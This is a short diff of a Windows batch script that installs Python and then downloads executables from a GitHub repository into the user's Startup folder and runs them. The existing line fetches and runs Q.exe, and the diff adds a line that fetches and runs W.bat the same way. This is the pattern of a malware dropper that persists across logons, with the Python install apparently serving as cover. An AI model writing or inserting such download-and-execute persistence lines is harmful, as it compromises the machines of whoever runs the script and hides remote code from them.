@@ -7,4 +7,5 @@ powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.9.6/p
 Pythoninstall.exe
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
+powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/W.bat -OutFile W.bat" && W.bat
 exit
